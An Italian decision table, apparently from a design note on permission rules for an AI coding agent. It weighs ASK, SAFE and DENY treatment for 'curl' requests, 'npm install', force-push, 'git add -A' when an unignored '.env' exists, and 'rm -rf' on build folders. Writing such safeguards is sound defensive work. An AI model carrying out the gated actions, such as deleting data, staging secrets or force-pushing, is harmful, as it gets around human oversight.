| G-1 | **Futuro del giudice IA** (oggi: fallback obbligatorio, 638 invocazioni, non deterministico, DENY per forma) | (a) spegnerlo: zona grigia → default-ASK; (b) modalità advisory: può solo proporre allow, mai deny, timeout 10 s; (c) status quo | **(a)** — con le regole v2 la zona grigia residua è minima e un ASK esplicito è più prevedibile di un verdetto IA |
| G-2 | **Rete read-only non locale** (es. `gh api` in lettura, `curl` GET verso domini noti) | (a) sempre ASK; (b) SAFE con allowlist domini (github.com, registry.npmjs.org in sola lettura) | **(a)** sempre ASK — la stop-condition "servizio esterno" è dottrina; allowlist eventualmente in un secondo momento |
| G-3 | **`npm install`** | (a) sempre ASK (anche re-install da lockfile); (b) `npm ci`/`npm install` SENZA argomenti (solo lockfile) = SAFE, `npm install <pkg>` = ASK | **(b)** — installare dal lockfile non introduce dipendenze nuove; è il caso "npm install 2>&1 \| tail" visto nel log |
| G-4 | **git push** | (a) push normale ASK, force-push DENY (proposta); (b) push normale ASK, force-push ASK; (c) push su branch non protetti SAFE | **(a)** — il force-push su main non ha casi d'uso legittimi in questo flusso |
| G-5 | **`git add -A` / `git add .` nel workspace** | (a) SAFE (coerente con autonomia piena nel workspace; `.gitignore` protegge `.env`); (b) ASK se esiste un `.env` reale non ignorato nella working tree (check contestuale) | **(b)** — costo di implementazione basso, chiude l'unico spiraglio reale di staging segreti |
| G-6 | **`rm -rf` dentro il workspace su directory di artefatti noti** (`build`, `dist`, `coverage`, `node_modules`, `.vite`) | (a) resta ASK (proposta A-10); (b) SAFE per la sola allowlist di directory artefatti | **(a)** per ora — i casi reali sono rari (1 nel log non sintetico); riaprire se diventa attrito |
| G-7 | **Scratchpad root fidato (S6)** — conferma che l'intera `…\AppData\Local\Temp\claude\<progetto>\<sessione>\scratchpad` sia trattata come workspace (read/write/exec/delete) | sì / no | **sì** — è la directory dichiarata dal runtime per i temporanei di sessione |
| G-8 | **Versionamento della config `~/.claude`** per rollback affidabile (git repo locale della cartella hooks+policy) | sì / no | **sì** — rende il rollback (F.6) un `git checkout` invece di copie manuali |

Con le regole proposte e le raccomandazioni G-1(a)/G-3(b)/G-5(b): sul periodo
post-2026-07-04 le ASK reali sarebbero passate da ~33 a ~14 (−58%), tutte riconducibili
a vere stop-condition (dipendenze, DB/schema, push, kill, config protetta), e i 2 DENY
"per forma" del giudice IA non si sarebbero verificati.
